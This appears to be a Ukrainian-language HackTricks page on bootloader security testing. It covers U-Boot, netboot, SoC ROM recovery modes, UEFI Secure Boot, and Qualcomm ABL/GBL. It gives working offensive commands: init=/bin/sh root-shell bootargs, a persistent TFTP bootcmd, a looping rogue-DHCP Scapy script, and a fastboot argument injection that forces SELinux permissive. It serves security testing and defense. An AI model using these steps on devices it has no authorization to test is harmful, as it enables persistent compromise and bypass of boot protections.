# Тестування bootloader

{{#include ../../banners/hacktricks-training.md}}

Наведені нижче кроки рекомендовано виконувати для зміни конфігурацій запуску пристрою та тестування bootloader, як-от U-Boot і завантажувачів класу UEFI. Зосередьтеся на отриманні виконання коду на ранньому етапі, оцінюванні захисту підпису й відкату та зловживанні шляхами відновлення або мережевого завантаження.

Пов’язана тема: обхід secure boot на MediaTek за допомогою патча bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Швидкі перемоги в U-Boot і зловживання змінними середовища

1. Отримайте доступ до оболонки інтерпретатора
   - Під час завантаження натисніть відому клавішу переривання (часто будь-яку клавішу, 0, пробіл або специфічну для плати «магічну» послідовність), перш ніж виконається `bootcmd`, щоб перейти до командного рядка U-Boot.<sup>[[1]](#references)</sup>

2. Перевірте стан завантаження та змінні
   - Корисні команди:
     - `printenv` (вивести змінні середовища)
     - `bdinfo` (інформація про плату, адреси пам’яті)
     - `help bootm; help booti; help bootz` (підтримувані способи завантаження ядра)
     - `help ext4load; help fatload; help tftpboot` (доступні завантажувачі)

3. Змініть аргументи завантаження, щоб отримати root shell
   - Додайте `init=/bin/sh`, щоб ядро запускало оболонку замість звичайної системи ініціалізації:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot із вашого TFTP-сервера
   - Налаштуйте мережу й отримайте образ kernel/fit із LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Зберігайте зміни через середовище
   - Якщо сховище env не захищене від запису, ви можете зберегти контроль:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Перевірте змінні на кшталт `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, які впливають на шляхи резервного завантаження. Неправильно налаштовані значення можуть дозволити знову й знову переходити до shell.

6. Перевірте функції налагодження та небезпечні функції
   - Перевірте наявність: `bootdelay` > 0, вимкненого `autoboot`, необмеженого виконання `usb start; fatload usb 0:1 ...`, можливості виконувати `loady`/`loads` через serial, імпортування `env` із ненадійних носіїв, а також завантаження ядер/ramdisk без перевірки підпису.

7. Перевірка образів U-Boot і верифікації
   - Якщо платформа заявляє про secure/verified boot із FIT-образами, спробуйте завантажити як непідписані, так і змінені образи:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Відсутність `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` або застаріла поведінка `verify=n` часто дає змогу завантажувати довільні payloads.
   - Не обмежуйтеся простим результатом «дозволено/заборонено»: нещодавнє дослідження FIT показало, що сам шлях перевірки може бути поверхнею для атак pre-auth. Перевірте негативними тестами зовнішньо збережені дані FIT (`data-offset`, `data-position`, `data-size`), вибір підписаної конфігурації, обробку `loadables` та overlay / `extra-conf`.
   - Якщо у вас є відповідне дерево вихідного коду, `test/vboot/vboot_test.sh` — це швидкий спосіб відтворити поведінку перевірки FIT у U-Boot sandbox, перш ніж працювати зі справжнім обладнанням.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` і сценарії завантаження
   - У сучасних збірках U-Boot `bootcmd` часто є лише обгорткою для Standard Boot. Це означає, що носії з можливістю запису, PXE або SPI flash можуть стати справжньою межею довіри, навіть якщо видиме середовище виглядає нешкідливо.
   - `extlinux` bootmeth шукає `extlinux/extlinux.conf` у `/` та `/boot`; script bootmeth спочатку шукає `boot.scr.uimg`, а потім `boot.scr`. Під час мережевого завантаження ім’я сценарію може надходити з `boot_script_dhcp`.
   - Корисні команди для первинного аналізу:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Сценарії зловживання для тестування: контрольовані зловмисником USB/SD-носії, що стоять раніше в `boot_targets`, доступний для запису `/boot/extlinux/extlinux.conf`, підроблений TFTP-сервер, який надає `boot.scr`, або виконання скриптів зі SPI через `script_offset_f`.
   - Якщо платформа покладається на перевірку FIT, переконайтеся, що конфігурації підписані на рівні конфігурації, а не лише окремі образи; `required-mode=all` надійніше, ніж приймати будь-який один обов’язковий ключ.

## Поверхня мережевого завантаження (DHCP/PXE) і підроблені сервери

9. Fuzzing параметрів PXE/DHCP
   - Обробка застарілого BOOTP/DHCP в U-Boot мала проблеми з безпекою пам’яті. Наприклад, CVE‑2024‑42040 описує розкриття пам’яті через спеціально сформовані відповіді DHCP, які можуть передавати байти з пам’яті U-Boot назад мережею.<sup>[[4]](#references)</sup> Перевірте шляхи обробки DHCP/PXE за допомогою надто довгих значень і граничних випадків (назва завантажувального файла в опції 67, опції постачальника, поля файла/імені сервера) та спостерігайте за зависаннями й витоками.
   - Мінімальний фрагмент Scapy для навантажувального тестування параметрів під час мережевого завантаження:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Також перевірте, чи поля імені файлу PXE передаються до логіки shell/loader без санітизації, коли вони використовуються в скриптах підготовки ОС.

10. Тестування ін’єкції команд через rogue DHCP-сервер
   - Налаштуйте rogue DHCP/PXE-сервіс і спробуйте вставити символи в поля імені файлу або параметрів, щоб на наступних етапах ланцюжка завантаження передати їх інтерпретаторам команд. Для цього добре підходять DHCP auxiliary у Metasploit, `dnsmasq` або власні скрипти Scapy. Спершу ізолюйте лабораторну мережу.

## Режими відновлення SoC ROM, що обходять звичайне завантаження

Багато SoC підтримують режим BootROM «loader», який приймає код через USB/UART, навіть якщо образи у flash-пам’яті недійсні. Якщо запобіжники secure-boot не запрограмовані, це може забезпечити довільне виконання коду на дуже ранньому етапі ланцюжка завантаження.

- NXP i.MX (Serial Download Mode)
  - Інструменти: `uuu` (mfgtools3) або `imx-usb-loader`.
  - Приклад: `imx-usb-loader u-boot.imx` завантажує власний U-Boot у RAM і запускає його.
- Allwinner (FEL)
  - Інструмент: `sunxi-fel`.
  - Приклад: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` або `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Інструмент: `rkdeveloptool`.
  - Приклад: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` завантажує loader, а потім власний U-Boot.

З’ясуйте, чи запрограмовані eFuses/OTP для secure-boot на пристрої. Якщо ні, режими завантаження BootROM часто дають змогу обійти будь-які перевірки на вищих рівнях (U-Boot, kernel, rootfs), безпосередньо виконавши ваш payload першого етапу із SRAM/DRAM.

## Завантажувачі UEFI/PC-класу: швидкі перевірки

11. Тестування підміни ESP, відкату та реєстрації ключів
   - Підключіть EFI System Partition (ESP) і перевірте компоненти завантажувача: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, шляхи до логотипів виробника.
   - За можливості отримайте стан Secure Boot і бази даних ключів з ОС:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Якщо платформа перебуває в Setup Mode, приймає реєстрацію ключів без автентифікації або постачається з тестовим/стандартним Platform Key (клас PKfail), локальний адміністратор або зловмисник із фізичним доступом може зареєструвати власні KEK/db і залишити Secure Boot «увімкненим», водночас завантажуючи довільні EFI-бінарні файли.<sup>[[3]](#references)</sup>
   - Спробуйте завантажитися зі старішими або відомими вразливими підписаними компонентами завантаження, якщо список відкликань Secure Boot (dbx) не оновлений. Якщо платформа й далі довіряє старим shim/bootmanager, часто можна завантажити власне ядро або `grub.cfg` з ESP, щоб закріпитися в системі.

12. Тестування відкликання застарілих shim / SBAT / dbx
   - Старі підписані Microsoft shim і форки виробників усе ще можуть слугувати шляхом для bootkit у стилі BYOVD, якщо списки відкликань застарілі. В ізольованій лабораторії помістіть історично вразливий shim на ESP і спробуйте передати керування власному `grubx64.efi` або ядру.<sup>[[11]](#references)</sup>
   - Швидке сортування:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Якщо shim усе ще запускається, попри те що його внесено до списку відкликання, у прошивці/ОС застарілі оновлення `dbx` або вона довіряє форкнутому завантажувачу, який не успадкував захисти SBAT з upstream.

13. Помилки обробки логотипів завантаження (клас LogoFAIL)
   - Кілька прошивок OEM/IBV були вразливі до помилок обробки зображень у DXE, що обробляє логотипи завантаження. Якщо зловмисник може розмістити спеціально сформоване зображення в ESP за шляхом, специфічним для виробника (наприклад, `\EFI\<vendor>\logo\*.bmp`), і перезавантажити пристрій, може стати можливим виконання коду на ранньому етапі завантаження навіть із увімкненим Secure Boot. Перевірте, чи приймає платформа логотипи, надані користувачем, і чи можна записувати файли за цими шляхами з ОС.<sup>[[2]](#references)</sup>


## Прогалини довіри в Android/Qualcomm ABL + GBL (Android 16)

На пристроях з Android 16, де Qualcomm ABL завантажує **Generic Bootloader Library (GBL)**, перевірте, чи **автентифікує** ABL застосунок UEFI, який він завантажує з розділу `efisp`. Якщо ABL лише перевіряє **наявність** застосунку UEFI й не перевіряє підписи, примітив запису в `efisp` дає змогу виконувати **непідписаний код до запуску ОС** під час завантаження.<sup>[[6]](#references)[[7]](#references)</sup>

Практичні перевірки та шляхи зловживання:

- **Примітив запису в efisp**: Потрібен спосіб записати власний застосунок UEFI в `efisp` (root/привілейована служба, помилка в застосунку OEM, шлях через recovery/fastboot). Без цього прогалина в механізмі завантаження GBL безпосередньо недоступна.<sup>[[6]](#references)</sup>
- **Ін’єкція аргументів fastboot OEM** (помилка ABL): Деякі збірки приймають додаткові токени в `fastboot oem set-gpu-preemption` і додають їх до командного рядка ядра. Це можна використати, щоб примусово ввімкнути permissive-режим SELinux і отримати змогу записувати дані в захищені розділи:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Якщо пристрій пропатчено, команда має відхиляти додаткові аргументи.<sup>[[5]](#references)[[6]](#references)</sup>
- **Розблокування bootloader через постійні прапорці**: Payload на етапі завантаження може змінити постійні прапорці розблокування (наприклад, `is_unlocked=1`, `is_unlocked_critical=1`), імітуючи `fastboot oem unlock` без перевірок OEM-сервера чи схвалення. Після наступного перезавантаження цей стан зберігається.<sup>[[6]](#references)</sup>

Примітки щодо захисту та первинного аналізу:

- З’ясуйте, чи ABL виконує перевірку підпису payload GBL/UEFI з `efisp`. Якщо ні, вважайте `efisp` поверхнею високого ризику для persistence.
- Перевірте, чи пропатчено обробники ABL fastboot OEM, щоб вони **перевіряли кількість аргументів** і відхиляли додаткові токени.<sup>[[8]](#references)[[9]](#references)</sup>

## Застереження щодо обладнання

Будьте обережні під час роботи з SPI/NAND flash на ранньому етапі завантаження (наприклад, заземлюючи контакти, щоб обійти читання) і завжди звіряйтеся з документацією на flash. Невчасне коротке замикання може пошкодити пристрій або програматор.

## Примітки та додаткові поради

- Спробуйте `env export -t ${loadaddr}` і `env import -t ${loadaddr}`, щоб переміщати дампи змінних середовища між RAM і сховищем; деякі платформи дозволяють імпортувати змінні середовища зі знімного носія без автентифікації.
- Для persistence у системах на базі Linux, які завантажуються через `extlinux.conf`, часто достатньо змінити рядок `APPEND` (додавши `init=/bin/sh` або `rd.break`) у розділі завантаження, якщо перевірка підпису не виконується.
- Якщо ціль використовує оновлення з двома слотами / A/B, перегляньте методи обходу захисту від відкату та розсинхронізації слотів в [огляді аналізу firmware](README.md), щоб не пропустити прогалини довіри, доступні лише засобу оновлення, поза межами самого bootloader.
- Якщо userland надає `fw_printenv/fw_setenv`, перевірте, чи відповідає `/etc/fw_env.config` фактичному сховищу змінних середовища. Неправильно налаштовані зсуви дають змогу читати/записувати не той регіон MTD.

## References

- [1] [Методологія тестування безпеки firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Виявлення LogoFAIL: небезпеки обробки зображень під час завантаження системи](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: ненадійні ключі платформи підривають Secure Boot в екосистемі UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Деталі CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: розблокування Xiaomi через два неочищені рядки](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Експлойт GBL для Qualcomm Snapdragon 8 Elite дає змогу зловмисникам розблоковувати bootloader](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Архітектура Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: виправлено передавання ненадійних даних у командний рядок ядра](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: додано перевірку команди set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Непридатний до завантаження: злам перевірки підпису FIT у U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Повідомлення про вразливість VU#616257 — підписані Microsoft завантажувачі UEFI shim вразливі до обходу Secure Boot](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
